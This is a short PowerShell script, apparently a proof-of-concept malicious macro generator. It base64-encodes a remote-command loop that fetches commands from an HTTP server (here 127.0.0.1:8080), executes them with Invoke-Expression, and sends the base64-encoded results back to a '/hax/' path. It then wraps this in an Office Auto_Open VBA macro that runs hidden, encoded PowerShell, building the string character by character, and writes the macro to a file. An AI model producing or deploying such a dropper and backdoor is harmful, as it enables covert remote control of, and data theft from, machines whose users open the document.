$plaintext = 'while ($True){$i="127.0.0.1:8080";$a=Invoke-WebRequest -Method Get -Uri "http://$i/cli" -UseBasicParsing;Write-Host $a;If($a.Content  -ne ""){try{$b=Invoke-Expression $a | Out-String}catch{$b=$error[0].Exception};$c=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b));$e="http://$i/hax/";$d=$e+$c;Invoke-WebRequest -Method get $d}Else{Invoke-WebRequest -Method get http://$i/}sleep 2}'
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($plaintext))
#'Attribute VB_Name = "Module1"' +"`r`n"+'Sub Auto_Open()'+"`r`n"+'Dim exec As String'+"`r`n"+'exec = "powershell.exe -windowstyle hidden -enc '+ $encoded +'"' +"`r`n"+ 'Shell (exec)' +"`r`n"+ 'End Sub' | Out-File -Encoding ascii POC.bas

$payload = @('Sub Auto_Open()','Dim exec As String','exec = "powershell.exe -windowstyle hidden -enc"')
foreach ($item in $encoded.ToCharArray()) {
    $payload += ('exec = exec + ' + '"' +  $item + '"') 

    }
$payload += 'Shell(exec)'
$payload += 'End Sub'

$payload | Out-File -FilePath .\Macro_payload.txt